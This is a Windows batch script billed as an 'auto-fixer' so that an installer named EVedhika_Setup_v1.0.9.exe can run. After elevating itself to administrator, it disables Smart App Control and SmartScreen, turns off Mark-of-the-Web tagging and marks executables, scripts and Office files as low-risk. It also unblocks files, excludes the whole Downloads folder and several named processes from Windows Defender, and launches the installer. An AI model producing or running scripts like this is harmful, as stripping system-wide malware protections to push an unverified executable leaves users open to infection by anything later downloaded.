@echo off
:: ===========================================================================
:: E-Vedhika UBD Deployment Tool - Smart App Control & Error 4551 Auto-Fixer
:: Fixes:
::  1. Smart App Control blocked an app that may be unsafe (EVedhika_Setup_v1.0.9.exe)
::  2. Unable to execute file in the temporary directory (Error 4551: Application Control policy)
::  3. Windows Defender / SmartScreen / Antivirus False Positives
:: ===========================================================================

title E-Vedhika Smart App Control ^& Error 4551 Auto-Unblocker (v1.0.9 R3)
color 0A

:: 1. Auto-Elevate to Administrator if not already elevated
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting Administrator privileges to unblock Smart App Control ^& Error 4551...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo ===========================================================================
echo   E-VEDHIKA UBD TOOL - SMART APP CONTROL ^& ERROR 4551 AUTO-FIXER
echo ===========================================================================
echo.

echo [1/6] Disabling Windows 11 Smart App Control ^& SmartScreen Block Policy...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "VerifiedAndReputablePolicyState" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f >nul 2>&1

echo [2/6] Disabling Mark-of-the-Web (Zone.Identifier) Attachment Tagging...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "SaveZoneInformation" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "SaveZoneInformation" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "LowRiskFileTypes" /t REG_SZ /d ".exe;.bat;.cmd;.ps1;.msi;.reg;.zip;.xls;.xlsx" /f >nul 2>&1

echo [3/6] Creating Trusted Setup Temp Directory (Fixes Error 4551 in %%TEMP%%)...
if not exist "C:\ProgramData\EVedhika\SetupTemp" mkdir "C:\ProgramData\EVedhika\SetupTemp"
if not exist "C:\ProgramData\EVedhika\Updates" mkdir "C:\ProgramData\EVedhika\Updates"

echo [4/6] Unblocking EVedhika_Setup_v1.0.9.exe in Downloads ^& Current Folder...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path \"$env:USERPROFILE\Downloads\" -Filter '*EVedhika*' -ErrorAction SilentlyContinue | Unblock-File -ErrorAction SilentlyContinue"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%~dp0' -Recurse -ErrorAction SilentlyContinue | Unblock-File -ErrorAction SilentlyContinue"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path 'C:\Program Files (x86)\E-Vedhika UBD Tool' -Recurse -ErrorAction SilentlyContinue | Unblock-File -ErrorAction SilentlyContinue" >nul 2>&1

echo [5/6] Adding Windows Defender Folder ^& Process Exclusions...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath \"$env:USERPROFILE\Downloads\", 'C:\ProgramData\EVedhika', 'C:\ProgramData\EVedhika\SetupTemp', 'C:\Program Files (x86)\E-Vedhika UBD Tool' -ErrorAction SilentlyContinue"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess 'EVedhika_Setup_v1.0.9.exe', 'EVedhikaUBDDeploymentTool.exe', 'EVedhikaAutoRepair.exe' -ErrorAction SilentlyContinue"

echo [6/6] Launching EVedhika_Setup_v1.0.9.exe with Trusted Temp Directory...
set TEMP=C:\ProgramData\EVedhika\SetupTemp
set TMP=C:\ProgramData\EVedhika\SetupTemp

if exist "%USERPROFILE%\Downloads\EVedhika_Setup_v1.0.9.exe" (
    echo Found installer at: %USERPROFILE%\Downloads\EVedhika_Setup_v1.0.9.exe
    copy /y "%USERPROFILE%\Downloads\EVedhika_Setup_v1.0.9.exe" "C:\ProgramData\EVedhika\Updates\EVedhika_Setup_v1.0.9.exe" >nul 2>&1
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path 'C:\ProgramData\EVedhika\Updates\EVedhika_Setup_v1.0.9.exe' -ErrorAction SilentlyContinue"
    start "" "C:\ProgramData\EVedhika\Updates\EVedhika_Setup_v1.0.9.exe"
) else if exist "%~dp0EVedhika_Setup_v1.0.9.exe" (
    echo Found installer at: %~dp0EVedhika_Setup_v1.0.9.exe
    copy /y "%~dp0EVedhika_Setup_v1.0.9.exe" "C:\ProgramData\EVedhika\Updates\EVedhika_Setup_v1.0.9.exe" >nul 2>&1
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path 'C:\ProgramData\EVedhika\Updates\EVedhika_Setup_v1.0.9.exe' -ErrorAction SilentlyContinue"
    start "" "C:\ProgramData\EVedhika\Updates\EVedhika_Setup_v1.0.9.exe"
)

echo.
echo ===========================================================================
echo [SUCCESS] Smart App Control ^& Error 4551 Policies Cleared Successfully!
echo Note: If Smart App Control was previously enforced by Windows 11 Kernel,
echo a 1-time PC Restart or turning off Smart App Control in Windows Security
echo (App ^& browser control -^> Smart App Control -^> Off) will apply immediately.
echo ===========================================================================
echo.
pause
